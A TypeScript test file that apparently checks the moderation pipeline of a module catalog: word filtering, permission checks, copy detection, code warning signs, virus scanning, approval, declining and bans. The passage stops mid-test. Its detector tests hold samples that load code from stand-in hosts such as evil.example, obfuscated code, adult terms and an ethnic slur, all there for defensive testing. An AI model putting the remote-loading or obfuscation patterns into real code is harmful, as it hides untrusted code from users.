import { createHash, createPublicKey, generateKeyPairSync, randomBytes, type KeyObject } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { publishSignature, signFiles, writeZip, type ZipFile } from "@tavora/pack";
import { describe, expect, it } from "vitest";
import { AccountStore } from "./account-store.ts";
import { createAdminApp } from "./admin-app.ts";
import { createApp } from "./app.ts";
import { CatalogStore } from "./catalog.ts";
import { buildDataset, writeDatabase } from "./dataset.ts";
import { createHostedStore } from "./hosted-store.ts";
import { IconState } from "./icon-state.ts";
import { createTestInbox } from "./mail.ts";
import { moderationRoutes } from "./moderation-admin.ts";
import { encodePng } from "./png.ts";
import { keyFingerprint } from "./publishers.ts";
import { createRateLimiter } from "./rate-limit.ts";
import { createSubmissions } from "./submissions.ts";
import type { Scanner } from "./virus-scan.ts";

const db = writeDatabase(":memory:", buildDataset({ builtIns: [{ id: "elden-ring", name: "Elden Ring" }], wikidata: [], steam: [] }));
const roomy = () => createRateLimiter({ limit: 1000, windowMs: 60_000 });
const rawKey = (key: KeyObject) => createPublicKey(key).export({ format: "der", type: "spki" }).subarray(12);
const clean: Scanner = { scan: async () => ({ clean: true }) };
const picture = (seed: number) => Buffer.from(encodePng(16, 16, Uint8Array.from({ length: 16 * 16 * 4 }, (_, i) => (i % 4 === 3 ? 255 : (i * seed) % 256))));
/** Text of a given size that no other test's file shares. */
const filler = (seed: string, bytes = 3000) => Buffer.from(`${seed}:`.repeat(Math.ceil(bytes / (seed.length + 1))).slice(0, bytes));

interface ZipOptions {
  id?: string;
  version?: string;
  name?: string;
  description?: string;
  network?: string[];
  connectors?: string[];
  translations?: Record<string, { name?: string; description?: string }>;
  readme?: string;
  notes?: string[];
  icon?: Buffer;
  screenshots?: Buffer[];
  extra?: ZipFile[];
}

function moduleZip(key: KeyObject, options: ZipOptions = {}): Buffer {
  const { id = "wellbrained.timer", version = "1.0.0", name = "Timer", description, network = [], connectors, translations, readme, notes, icon, screenshots = [], extra = [] } = options;
  const manifest = {
    id,
    name,
    version,
    apiVersion: "1",
    ...(translations ? { minTavora: "0.21.0" } : {}),
    entry: "index.html",
    games: [],
    viewport: { minWidth: 200, minHeight: 150 },
    ...(description ? { description } : {}),
    ...(translations ? { translations } : {}),
    ...(readme ? { readme: "README.md" } : {}),
    ...(notes ? { changelog: "changelog.json" } : {}),
    ...(icon ? { icon: "icon.png" } : {}),
    ...(screenshots.length ? { screenshots: screenshots.map((_, index) => `shot${index}.png`) } : {}),
    permissions: { network, ...(connectors ? { connectors } : {}) },
  };
  const files: ZipFile[] = [
    { name: "tavora.module.json", data: Buffer.from(JSON.stringify(manifest)) },
    { name: "index.html", data: Buffer.from("<p>timer</p>") },
    ...(readme ? [{ name: "README.md", data: Buffer.from(readme) }] : []),
    ...(notes ? [{ name: "changelog.json", data: Buffer.from(JSON.stringify([{ version, notes }])) }] : []),
    ...(icon ? [{ name: "icon.png", data: icon }] : []),
    ...screenshots.map((data, index) => ({ name: `shot${index}.png`, data })),
    ...extra,
  ];
  return writeZip([...files, signFiles(files, key)]);
}

function setup(options: { scanner?: Scanner | undefined; maintainer?: string; waitingPerAccount?: number } = {}) {
  const store = new AccountStore(":memory:");
  const dir = mkdtempSync(path.join(tmpdir(), "tavora-moderation-"));
  const catalog = new CatalogStore(dir);
  const clock = { now: Date.parse("2026-10-26T12:00:00Z") };
  const inbox = createTestInbox();
  const scanner = "scanner" in options ? options.scanner : clean;
  const app = createApp({
    db,
    catalog,
    rateLimiter: roomy(),
    publishRateLimiter: roomy(),
    publishLimits: { uploadsPerDay: 100, ...(options.waitingPerAccount ? { waitingPerAccount: options.waitingPerAccount } : {}) },
    ...(scanner ? { scanner } : {}),
    accounts: { store, mailer: inbox, now: () => clock.now, prefixRateLimiter: roomy() },
    ...(options.maintainer ? { maintainerEmail: options.maintainer } : {}),
  });
  const admin = moderationRoutes({ catalog, accounts: store, scanner, mailer: inbox, now: () => clock.now });
  const tokens = new Map<KeyObject, string>();
  /** An account with a linked key, signed in. `approved` (the default): it has had a version approved already. */
  const developer = (email: string, approved = true) => {
    const key = generateKeyPairSync("ed25519").privateKey;
    const account = store.createAccount({ email }, clock.now);
    store.linkKey(account.id, keyFingerprint(rawKey(key)), rawKey(key).toString("base64"), clock.now);
    store.setDeveloperName(account.id, `dev-${email.split("@")[0]}`, clock.now);
    const { token } = store.createSession(account.id, "windows", clock.now);
    tokens.set(key, token);
    if (approved) catalog.trustAccount(account.id, new Date(clock.now));
    return { key, accountId: account.id, token };
  };
  const send = (key: KeyObject, zip: Buffer, language?: string, auth?: string) =>
    app.request("http://tavora.test/v1/catalog/publish", {
      method: "POST",
      headers: { "content-type": "application/zip", "x-tavora-signature": publishSignature(key, zip), authorization: `Bearer ${auth ?? tokens.get(key)}`, ...(language ? { "accept-language": language } : {}) },
      body: new Uint8Array(zip),
    });
  const own = async (method: string, url: string, key: KeyObject) => app.request(`http://tavora.test/v1/catalog${url}`, { method, headers: { authorization: `Bearer ${tokens.get(key)}` } });
  const post = (url: string, body: unknown) => admin.request(`http://admin.test${url}`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
  const get = (url: string) => admin.request(`http://admin.test${url}`);
  const sha = (zip: Buffer) => createHash("sha256").update(zip).digest("hex");
  const zipFile = (hash: string) => path.join(dir, "zips", `${hash}.zip`);
  type Answer = { status: string; reasons?: { check: string; text: string }[]; id?: string };
  const answer = async (response: Response) => ({ http: response.status, ...((await response.json()) as Answer) });
  /** The checks that made an upload wait ("listed" when none did). */
  const verdict = async (response: Response) => {
    const body = await answer(response);
    return body.http === 201 ? "listed" : (body.reasons ?? []).map((reason) => reason.check).sort().join(",");
  };
  return { store, catalog, dir, inbox, clock, developer, tokens, send, own, post, get, sha, zipFile, answer, verdict, admin, app };
}

describe("a new version that passes every check", () => {
  it("lists at once, like before, and tells the developer it was published", async () => {
    const { developer, send, answer, inbox, catalog } = setup();
    const { key } = developer("dev@example.com");
    expect(await answer(await send(key, moduleZip(key)))).toMatchObject({ http: 201, status: "published", id: "wellbrained.timer" });
    expect(catalog.index().map((entry) => entry.id)).toEqual(["wellbrained.timer"]);
    expect(inbox.mails().map((mail) => mail.subject)).toEqual(["Timer 1.0.0 was published"]);
  });
});

describe("check 1: the word filter", () => {
  it("looks at the name, every description, the changelog notes and the readme", async () => {
    const { developer, send, verdict } = setup({ waitingPerAccount: 50 });
    const { key } = developer("dev@example.com");
    let version = 0;
    const next = (options: ZipOptions) => moduleZip(key, { id: `wellbrained.m${version}`, name: `Module ${version}`, version: `1.0.${version++}`, ...options });
    expect(await verdict(await send(key, next({ name: "Hentai Viewer" })))).toBe("words");
    expect(await verdict(await send(key, next({ description: "Great for NSFW fans" })))).toBe("words");
    expect(await verdict(await send(key, next({ description: "A timer", translations: { de: { description: "Ein Timer, ab 18" } } })))).toBe("words");
    expect(await verdict(await send(key, next({ notes: ["Added porn mode"] })))).toBe("words");
    expect(await verdict(await send(key, next({ readme: "# Timer\n\nContains xxx content." })))).toBe("words");
    expect(await verdict(await send(key, next({ readme: "# Timer\n\nSay hi to the kanake" })))).toBe("words");
    // Honest texts, links included, list at once.
    expect(await verdict(await send(key, next({ description: "A timer. See https://example.org", readme: "# Timer\n\nDocs at https://example.org/docs", notes: ["Fixes the crash"] })))).toBe("listed");
  });
});

describe("check 2: permissions", () => {
  it("holds a first version that asks for network or connectors, and an update that asks for more", async () => {
    const { developer, send, verdict } = setup();
    const { key } = developer("dev@example.com");
    expect(await verdict(await send(key, moduleZip(key, { id: "wellbrained.net", network: ["api.example.com"] })))).toBe("permissions");
    expect(await verdict(await send(key, moduleZip(key, { id: "wellbrained.disc", version: "1.0.0", connectors: ["discord"] })))).toBe("permissions");
    expect(await verdict(await send(key, moduleZip(key, { id: "wellbrained.plain", version: "1.0.0", name: "Plain" })))).toBe("listed");
    // Not more than before: lists. More hosts, or a new connector: waits.
    expect(await verdict(await send(key, moduleZip(key, { id: "wellbrained.plain", version: "1.1.0", name: "Plain" })))).toBe("listed");
    expect(await verdict(await send(key, moduleZip(key, { id: "wellbrained.plain", version: "1.2.0", name: "Plain", network: ["a.example.com"] })))).toBe("permissions");
  });

  it("compares an update to the last listed version, so a waiting one never lowers the bar", async () => {
    const { developer, send, verdict, post, catalog } = setup();
    const { key } = developer("dev@example.com");
    expect(await verdict(await send(key, moduleZip(key, { name: "Plain", network: ["a.example.com"], version: "1.0.0" })))).toBe("permissions");
    // Still no listed version: the next one is a "first version" again.
    expect(await verdict(await send(key, moduleZip(key, { name: "Plain", network: ["a.example.com"], version: "1.0.1" })))).toBe("permissions");
    const waiting = catalog.waitingVersions();
    expect((await post("/approve", { sha256: waiting[0]!.sha256 })).status).toBe(200);
    // 1.0.0 listed with a.example.com: asking for the same lists, for another waits.
    expect(await verdict(await send(key, moduleZip(key, { name: "Plain", network: ["a.example.com"], version: "1.0.2" })))).toBe("listed");
    expect(await verdict(await send(key, moduleZip(key, { name: "Plain", network: ["a.example.com", "b.example.com"], version: "1.0.3" })))).toBe("permissions");
  });
});

describe("check 3: copies", () => {
  it("holds a name like another publisher's module, but not the same publisher's", async () => {
    const { developer, send, verdict } = setup();
    const first = developer("first@example.com");
    const second = developer("second@example.com");
    expect(await verdict(await send(first.key, moduleZip(first.key, { id: "alpha.timer", name: "Super Timer Pro" })))).toBe("listed");
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.timer", name: "Super-Timer Pro" })))).toBe("copy");
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.timer2", name: "Super Timer Pr0" })))).toBe("copy");
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.other", name: "Something Else" })))).toBe("listed");
    expect(await verdict(await send(first.key, moduleZip(first.key, { id: "alpha.timer2", name: "Super Timer Pro Two" })))).toBe("listed");
    expect(await verdict(await send(first.key, moduleZip(first.key, { id: "alpha.timer3", name: "Super Timer Pro" })))).toBe("listed");
  });

  it("holds a zip whose files are mostly the same as another publisher's, by hash", async () => {
    const { developer, send, verdict } = setup();
    const first = developer("first@example.com");
    const second = developer("second@example.com");
    const big = [{ name: "app.js", data: filler("alpha-app", 6000) }, { name: "style.css", data: filler("alpha-css", 3000) }];
    expect(await verdict(await send(first.key, moduleZip(first.key, { id: "alpha.one", name: "One Thing", extra: big })))).toBe("listed");
    // The same files under another name: a copy. One new file among the same ones: still mostly the same.
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.two", name: "Second Thing", extra: big })))).toBe("copy");
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.three", name: "Third Thing", extra: [...big, { name: "x.js", data: filler("new", 1000) }] })))).toBe("copy");
    // Mostly new files: fine. And the first developer may reuse their own files.
    expect(await verdict(await send(second.key, moduleZip(second.key, { id: "beta.four", name: "Fourth Thing", extra: [big[1]!, { name: "app.js", data: filler("beta-app", 9000) }] })))).toBe("listed");
    expect(await verdict(await send(first.key, moduleZip(first.key, { id: "alpha.five", name: "Fifth Thing", extra: big })))).toBe("listed");
  });
});

describe("check 4: warning signs in the code", () => {
  const code = (text: string, name = "app.js") => [{ name, data: Buffer.from(text) }];
  const flagged = async (text: string, name?: string) => {
    const { developer, send, verdict } = setup();
    const { key } = developer("dev@example.com");
    return verdict(await send(key, moduleZip(key, { extra: code(text, name) })));
  };

  it("holds eval, new Function and strings run as code", async () => {
    for (const text of ["eval('1+1')", "const f = new Function('a', 'return a');", "x = Function('return this')()", "window.eval(code)", "setTimeout('alert(1)', 10)", "globalThis . eval ( x )"]) {
      expect(await flagged(text), text).toBe("code");
    }
  });

  it("holds WebAssembly, in code and as a file", async () => {
    expect(await flagged("WebAssembly.instantiate(bytes)")).toBe("code");
    expect(await flagged("x", "module.wasm")).toBe("code");
    const { developer, send, verdict } = setup();
    const { key } = developer("dev@example.com");
    expect(await verdict(await send(key, moduleZip(key, { extra: [{ name: "data.bin", data: Buffer.from([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0]) }] })))).toBe("code");
  });

  it("holds code loaded from the internet", async () => {
    for (const text of [
      "import('https://evil.example/x.js')",
      "import(url)",
      "import(url)\n{ run() }",
      "const a = 1; // import(x) below\nimport(url)",
      "import x from 'https://cdn.example/x.js'",
      "importScripts('x.js')",
      "document.createElement('script')",
      "new Worker('https://evil.example/w.js')",
    ]) {
      expect(await flagged(text), text).toBe("code");
    }
    expect(await flagged('<script src="https://cdn.example/lib.js"></script>', "page.html")).toBe("code");
    expect(await flagged('<svg xmlns="http://www.w3.org/2000/svg"><script href="https://cdn.example/x.js"/></svg>', "pic.svg")).toBe("code");
  });

  it("holds packed and obfuscated code", async () => {
    expect(await flagged(Array.from({ length: 12 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=1;`).join(""))).toBe("code");
    expect(await flagged("eval(function(p,a,c,k,e,d){return p}('0',1,1,'x'.split('|'),0,{}))")).toBe("code");
    expect(await flagged(`var a="${"\\x41".repeat(150)}";`)).toBe("code");
    expect(await flagged(`${"[]+(![]+[])+".repeat(80)}`)).toBe("code");
    expect(await flagged(`var p=atob("${"QUJD".repeat(1100)}");`)).toBe("code");
  });

  it("leaves honest code alone", async () => {
    const honest = [
      "function evaluate(x) { return x * 2 }",
      "math.eval('1+1') // a method called eval",
      "const isFunction = (v) => typeof v === 'function'; isFunction(1)",
      "const lazy = () => import('./chunk.js'); const url = 'https://example.org/api';",
      "fetch('https://api.example.com/data').then((r) => r.json())",
      "const x = 'new Fun' + 'ction'",
      "el.innerHTML = '<p>hi</p>'",
      "class Maps { async import(name, character) { return name } }",
      "class M{async import(e,t,n){return e}}",
      "class Maps { import(name: string, world?: Snapshot): Promise<void> { return save(name) } }",
      "repository.import(file)",
      "// node types come from the checked import (gameSkillData.json)",
    ];
    for (const text of honest) expect(await flagged(text), text).toBe("listed");
    expect(await flagged('<p>hello</p><script src="app.js"></script>', "page.html")).toBe("listed");
  });

  it("holds a code file too big to read", async () => {
    const { developer, send, verdict } = setup();
    const { key } = developer("dev@example.com");
    const big = randomBytes(9 * 1024 * 1024);
    expect(await verdict(await send(key, moduleZip(key, { extra: [{ name: "big.js", data: big }] })))).toBe("code");
  });
});

describe("check 5: the virus scan", () => {
  it("holds a zip the scanner flags", async () => {
    const { developer, send, answer } = setup({ scanner: { scan: async () => ({ clean: false, threats: ["Eicar-Test in app.js"] }) } });
    const { key } = developer("dev@example.com");
    const body = await answer(await send(key, moduleZip(key)));
    expect(body).toMatchObject({ http: 202, status: "waiting", reasons: [{ check: "virus", text: "The virus scan found something." }] });
  });

  it("holds a zip when the scanner is broken, slow or not set up: a scan that did not run is not a clean one", async () => {
    for (const scanner of [
      { scan: async () => Promise.reject(new Error("clamd is not reachable: ECONNREFUSED")) },
      { scan: () => { throw new Error("boom"); } },
      undefined,
    ] as (Scanner | undefined)[]) {
      const { developer, send, answer, catalog } = setup({ scanner });
      const { key } = developer("dev@example.com");
      const body = await answer(await send(key, moduleZip(key)));
      expect(body).toMatchObject({ http: 202, status: "waiting", reasons: [{ check: "virus" }] });
      expect(body.reasons![0]!.text).toContain("couldn't run");
      expect(catalog.index()).toEqual([]);
    }
  });
});

describe("what always waits", () => {
  it("holds the first module of an account that has had nothing approved, then trusts it once approved", async () => {
    const { developer, send, verdict, catalog, post } = setup();
    const fresh = developer("fresh@example.com", false);
    expect(await verdict(await send(fresh.key, moduleZip(fresh.key, { id: "fresh.one", name: "One" })))).toBe("first-module");
    // Still nothing approved: the next one waits too.
    expect(await verdict(await send(fresh.key, moduleZip(fresh.key, { id: "fresh.two", name: "Two" })))).toBe("first-module");
    expect(catalog.index()).toEqual([]);
    expect((await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 })).status).toBe(200);
    expect(await verdict(await send(fresh.key, moduleZip(fresh.key, { id: "fresh.three", name: "Three" })))).toBe("listed");
  });

  it("counts accounts that already had modules listed before the review as approved", async () => {
    const { developer, send, verdict, catalog } = setup();
    const old = developer("old@example.com", false);
    // A module added by hand or from before account ids were kept: signed by the account's key, no uploader.
    catalog.add(moduleZip(old.key, { id: "old.legacy", name: "Legacy" }));
    expect(await verdict(await send(old.key, moduleZip(old.key, { id: "old.next", name: "Next" })))).toBe("listed");
    // An account whose only module is delisted by a report still counts as approved by that listed version; one with only waiting ones does not.
    const other = developer("other@example.com", false);
    expect(await verdict(await send(other.key, moduleZip(other.key, { id: "other.one", name: "Other One" })))).toBe("first-module");
  });

  it("holds a new or changed icon or screenshots, not unchanged ones", async () => {
    const { developer, send, verdict, post, catalog } = setup();
    const { key } = developer("dev@example.com");
    expect(await verdict(await send(key, moduleZip(key, { icon: picture(3), screenshots: [picture(5)] })))).toBe("pictures");
    expect((await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 })).status).toBe(200);
    expect(await verdict(await send(key, moduleZip(key, { version: "1.0.1", icon: picture(3), screenshots: [picture(5)] })))).toBe("listed");
    expect(await verdict(await send(key, moduleZip(key, { version: "1.0.2", icon: picture(7), screenshots: [picture(5)] })))).toBe("pictures");
    expect(await verdict(await send(key, moduleZip(key, { version: "1.0.3", icon: picture(3), screenshots: [picture(5), picture(9)] })))).toBe("pictures");
    // Dropping pictures is not new pictures.
    expect(await verdict(await send(key, moduleZip(key, { version: "1.0.4" })))).toBe("listed");
  });

  it("gives every failed check its own reason, in one answer", async () => {
    const { developer, send, verdict } = setup({ scanner: undefined });
    const fresh = developer("fresh@example.com", false);
    const zip = moduleZip(fresh.key, { network: ["api.example.com"], description: "porn", extra: [{ name: "a.js", data: Buffer.from("eval(1)") }] });
    expect(await verdict(await send(fresh.key, zip))).toBe("code,first-module,permissions,virus,words");
  });
});

describe("a version that waits", () => {
  it("is not listed, handed out, reported, counted or served, and keeps its zip privately", async () => {
    const { developer, send, answer, catalog, store, zipFile, sha } = setup({ scanner: undefined });
    const { key, accountId } = developer("dev@example.com");
    const zip = moduleZip(key, { icon: picture(3) });
    const body = await answer(await send(key, zip));
    expect(body).toMatchObject({ http: 202, status: "waiting", id: "wellbrained.timer", version: "1.0.0" });
    expect(Object.keys(body.reasons![0]!).sort()).toEqual(["check", "text"]);
    const hash = sha(zip);
    expect(catalog.index()).toEqual([]);
    expect(catalog.module("wellbrained.timer")).toBeNull();
    expect(catalog.zip(hash)).toBeNull();
    expect(catalog.picture(catalog.waitingVersions()[0]!.icon!.sha256, "png")).toBeNull();
    expect(catalog.report({ id: "wellbrained.timer", owner: catalog.waitingVersions()[0]!.owner, sha256: hash })).toBe(false);
    expect(catalog.countInstall("wellbrained.timer")).toBe(false);
    expect(catalog.signedBy(catalog.waitingVersions()[0]!.owner, new Date(Date.now() + 1e9))).toEqual([]);
    expect(existsSync(zipFile(hash))).toBe(true);
    // The prefix is the account's from the first upload, as for a listed one.
    expect(store.prefixes(accountId)).toEqual(["wellbrained"]);
  });

  it("is not served by the public routes either", async () => {
    const { developer, send, app, sha } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    const zip = moduleZip(key);
    await send(key, zip);
    expect(await (await app.request("http://tavora.test/v1/catalog")).json()).toEqual({ modules: [] });
    expect((await app.request("http://tavora.test/v1/catalog/modules/wellbrained.timer")).status).toBe(404);
    expect((await app.request(`http://tavora.test/v1/catalog/zips/${sha(zip)}`)).status).toBe(404);
  });

  it("emails the developer in their language and the maintainer, and not the published mail", async () => {
    const { developer, send, inbox } = setup({ scanner: undefined, maintainer: "boss@example.com" });
    const { key } = developer("dev@example.com");
    const other = developer("de@example.com");
    await send(key, moduleZip(key));
    await send(other.key, moduleZip(other.key, { id: "other.timer", name: "Other Timer" }), "de-DE");
    const mails = inbox.mails().reverse();
    expect(mails.map((mail) => mail.to)).toEqual(["dev@example.com", "boss@example.com", "de@example.com", "boss@example.com"]);
    expect(mails[0]).toMatchObject({ subject: "Timer 1.0.0 is waiting for review" });
    expect(mails[0]!.text).toContain("The virus scan found something, or couldn't run.");
    expect(mails[0]!.text).toContain("catalog-rules");
    expect(mails[1]!.subject).toBe("Waiting for review: Timer 1.0.0");
    expect(mails[1]!.text).toContain("No virus scanner is set up");
    expect(mails[2]).toMatchObject({ subject: "Other Timer 1.0.0 wartet auf eine Prüfung" });
    expect(mails[2]!.text).toContain("Der Virenscan");
    expect(mails.some((mail) => mail.subject.includes("was published"))).toBe(false);
  });

  it("counts toward the day's uploads, and an account can have only so many waiting", async () => {
    const { developer, send, answer, catalog, own } = setup({ scanner: undefined, waitingPerAccount: 2 });
    const { key, accountId } = developer("dev@example.com");
    expect((await send(key, moduleZip(key, { version: "1.0.0" }))).status).toBe(202);
    expect((await send(key, moduleZip(key, { version: "1.0.1" }))).status).toBe(202);
    expect(catalog.uploadsSince(accountId, new Date(0))).toBe(2);
    const third = await answer(await send(key, moduleZip(key, { version: "1.0.2" })));
    expect(third).toMatchObject({ http: 429 });
    expect(JSON.stringify(third)).toContain("too-many-waiting");
    // Withdrawing one makes room.
    const first = catalog.waitingVersions()[0]!;
    expect((await own("DELETE", `/waiting/${first.sha256}`, key)).status).toBe(200);
    expect((await send(key, moduleZip(key, { version: "1.0.2" }))).status).toBe(202);
  });
});

describe("withdrawing a waiting version", () => {
  it("removes its row, zip and pictures, only for the account that uploaded it", async () => {
    const { developer, send, own, catalog, zipFile, dir, sha } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    const other = developer("other@example.com");
    const zip = moduleZip(key, { icon: picture(3) });
    await send(key, zip);
    const hash = sha(zip);
    expect((await own("DELETE", `/waiting/${hash}`, other.key)).status).toBe(404);
    expect(catalog.waitingVersions()).toHaveLength(1);
    const listed = (await own("GET", "/waiting", key).then((response) => response.json())) as { waiting: { sha256: string; reasons: { check: string }[] }[] };
    expect(listed.waiting.map((item) => item.sha256)).toEqual([hash]);
    expect(((await own("GET", "/waiting", other.key).then((response) => response.json())) as { waiting: unknown[] }).waiting).toEqual([]);
    const response = await own("DELETE", `/waiting/${hash}`, key);
    expect(await response.json()).toMatchObject({ status: "withdrawn", id: "wellbrained.timer", version: "1.0.0" });
    expect(catalog.waitingVersions()).toEqual([]);
    expect(existsSync(zipFile(hash))).toBe(false);
    expect(readdirSync(path.join(dir, "pictures"))).toEqual([]);
    expect(catalog.modules()).toEqual([]);
    // It can be uploaded again.
    expect((await send(key, zip)).status).toBe(202);
  });

  it("does not touch a listed version, and needs a sign-in", async () => {
    const { developer, send, own, catalog, sha, app } = setup();
    const { key } = developer("dev@example.com");
    const zip = moduleZip(key);
    expect((await send(key, zip)).status).toBe(201);
    expect((await own("DELETE", `/waiting/${sha(zip)}`, key)).status).toBe(404);
    expect(catalog.index()).toHaveLength(1);
    expect((await app.request(`http://tavora.test/v1/catalog/waiting/${sha(zip)}`, { method: "DELETE" })).status).toBe(401);
    expect((await app.request("http://tavora.test/v1/catalog/waiting/nothex", { method: "DELETE", headers: { authorization: "Bearer x" } })).status).toBe(401);
  });
});

describe("approving", () => {
  it("lists the version, trusts the account, tells the developer, and keeps only the newest zips", async () => {
    const { developer, send, post, catalog, inbox, answer } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    const zip = moduleZip(key);
    await send(key, zip);
    inbox.clear();
    const hash = catalog.waitingVersions()[0]!.sha256;
    expect(await answer(await post("/approve", { sha256: hash }))).toMatchObject({ http: 200, ok: true, mailed: true, id: "wellbrained.timer" });
    expect(catalog.index().map((entry) => entry.version)).toEqual(["1.0.0"]);
    expect(catalog.zip(hash)).not.toBeNull();
    expect(catalog.waitingVersions()).toEqual([]);
    expect(inbox.mails().map((mail) => mail.subject)).toEqual(["Timer 1.0.0 was published"]);
    expect((await post("/approve", { sha256: hash })).status).toBe(404);
  });

  it("emails in the language the developer published in", async () => {
    const { developer, send, post, catalog, inbox } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    await send(key, moduleZip(key), "de");
    inbox.clear();
    await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 });
    expect(inbox.mails()[0]!.subject).toBe("Timer 1.0.0 wurde veröffentlicht");
  });

  it("refuses an unknown version, a bad request, and a banned developer's version", async () => {
    const { developer, send, post, catalog, store } = setup({ scanner: undefined });
    const { key, accountId } = developer("dev@example.com");
    await send(key, moduleZip(key));
    const hash = catalog.waitingVersions()[0]!.sha256;
    expect((await post("/approve", {})).status).toBe(400);
    expect((await post("/approve", { sha256: "f".repeat(64) })).status).toBe(404);
    // A ban normally declines what waits; with only the account banned, approving still refuses.
    store.ban(accountId, "spam", null, [], Date.now());
    expect((await post("/approve", { sha256: hash })).status).toBe(409);
    expect(catalog.index()).toEqual([]);
  });

  it("does not approve a version whose zip is gone", async () => {
    const { developer, send, post, catalog, zipFile } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    await send(key, moduleZip(key));
    const hash = catalog.waitingVersions()[0]!.sha256;
    const { rmSync } = await import("node:fs");
    rmSync(zipFile(hash));
    expect((await post("/approve", { sha256: hash })).status).toBe(409);
    expect(catalog.index()).toEqual([]);
  });
});

describe("declining", () => {
  it("never lists it, deletes its zip and pictures, emails the reason and refuses the same zip again", async () => {
    const { developer, send, post, catalog, inbox, zipFile, dir, answer } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    const zip = moduleZip(key, { icon: picture(3) });
    await send(key, zip);
    inbox.clear();
    const hash = catalog.waitingVersions()[0]!.sha256;
    expect(await answer(await post("/decline", { sha256: hash, reason: "adult", note: "Please remove the artwork." }))).toMatchObject({ http: 200, ok: true, mailed: true });
    expect(catalog.index()).toEqual([]);
    expect(catalog.waitingVersions()).toEqual([]);
    expect(existsSync(zipFile(hash))).toBe(false);
    expect(readdirSync(path.join(dir, "pictures"))).toEqual([]);
    expect(inbox.mails()).toHaveLength(1);
    expect(inbox.mails()[0]!.subject).toBe("Timer 1.0.0 won't be in the catalog");
    expect(inbox.mails()[0]!.text).toContain("Reason: Adult content");
    expect(inbox.mails()[0]!.text).toContain("Please remove the artwork.");
    const again = await answer(await send(key, zip));
    expect(again.http).toBe(403);
    expect(JSON.stringify(again)).toContain("declined");
    // A fixed version is a new zip, and can be published.
    expect((await send(key, moduleZip(key, { version: "1.0.1" }))).status).toBe(202);
  });

  it("emails in German when the developer published in German, with every reason worded", async () => {
    const { developer, send, post, catalog, inbox } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    await send(key, moduleZip(key), "de");
    inbox.clear();
    await post("/decline", { sha256: catalog.waitingVersions()[0]!.sha256, reason: "broken" });
    expect(inbox.mails()[0]!.subject).toBe("Timer 1.0.0 kommt nicht in den Katalog");
    expect(inbox.mails()[0]!.text).toContain("Grund: Funktioniert nicht");
  });

  it("takes exactly the five reasons and a note of at most 500 characters", async () => {
    const { developer, send, post, catalog } = setup({ scanner: undefined });
    const { key } = developer("dev@example.com");
    for (const [index, reason] of ["unsafe", "hateful", "adult", "spam", "broken"].entries()) {
      await send(key, moduleZip(key, { version: `1.0.${index}` }));
      const hash = catalog.waitingVersions()[0]!.sha256;
      expect((await post("/decline", { sha256: hash, reason: "nope" })).status).toBe(400);
      expect((await post("/decline", { sha256: hash, reason, note: "x".repeat(501) })).status).toBe(400);
      expect((await post("/decline", { sha256: hash, reason })).status).toBe(200);
    }
    expect((await post("/decline", { sha256: "f".repeat(64), reason: "spam" })).status).toBe(404);
  });
});

describe("banning a developer", () => {
  it("stops every key, unlists all their modules, declines what waits and tells them", async () => {
    const { developer, send, post, catalog, store, inbox, answer } = setup({ scanner: undefined });
    const dev = developer("dev@example.com");
    const bystander = developer("bystander@example.com");
    // One listed (approved), one waiting, a second key, and a bystander's module.
    await send(dev.key, moduleZip(dev.key, { id: "wellbrained.a", name: "A" }));
    const hashA = catalog.waitingVersions()[0]!.sha256;
    await post("/approve", { sha256: hashA });
    await send(bystander.key, moduleZip(bystander.key, { id: "other.b", name: "B" }));
    await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 });
    await send(dev.key, moduleZip(dev.key, { id: "wellbrained.c", name: "C" }));
    const second = generateKeyPairSync("ed25519").privateKey;
    store.linkKey(dev.accountId, keyFingerprint(rawKey(second)), rawKey(second).toString("base64"), Date.now());
    inbox.clear();
    expect(catalog.index().map((entry) => entry.id)).toEqual(["other.b", "wellbrained.a"]);

    expect(await answer(await post("/ban", { accountId: dev.accountId, reason: "unsafe", note: "Steals logins." }))).toMatchObject({ http: 200, ok: true, unlisted: ["wellbrained.a"], declined: 1, mailed: true });
    expect(catalog.index().map((entry) => entry.id)).toEqual(["other.b"]);
    expect(catalog.waitingVersions()).toEqual([]);
    expect(inbox.mails()[0]!.subject).toBe("Your account can't publish to Tavora's catalog any more");
    expect(inbox.mails()[0]!.text).toContain("Reason: Unsafe or harmful");
    expect(inbox.mails()[0]!.text).toContain("Steals logins.");
    const refused = await answer(await send(dev.key, moduleZip(dev.key, { id: "wellbrained.d", name: "D", version: "2.0.0" })));
    expect(refused.http).toBe(403);
    expect(JSON.stringify(refused)).toContain("banned");
    // Their other key, a CI publish token and the bystander are not mixed up.
    const ci = store.createPublishToken(dev.accountId, "ci", Date.now())!.token;
    const viaSecond = await answer(await send(second, moduleZip(second, { id: "wellbrained.e", name: "E" }), undefined, dev.token));
    expect(viaSecond.http).toBe(403);
    expect(JSON.stringify(viaSecond)).toContain("banned");
    const viaToken = await answer(await send(dev.key, moduleZip(dev.key, { id: "wellbrained.f", name: "F" }), undefined, ci));
    expect(viaToken.http).toBe(403);
    expect(JSON.stringify(viaToken)).toContain("banned");
    expect((await send(bystander.key, moduleZip(bystander.key, { id: "other.g", name: "G" }))).status).not.toBe(403);
  });

  it("keeps a banned developer's keys from being linked to a new account, even after the account is deleted", async () => {
    const { developer, post, store } = setup({ scanner: undefined });
    const dev = developer("dev@example.com");
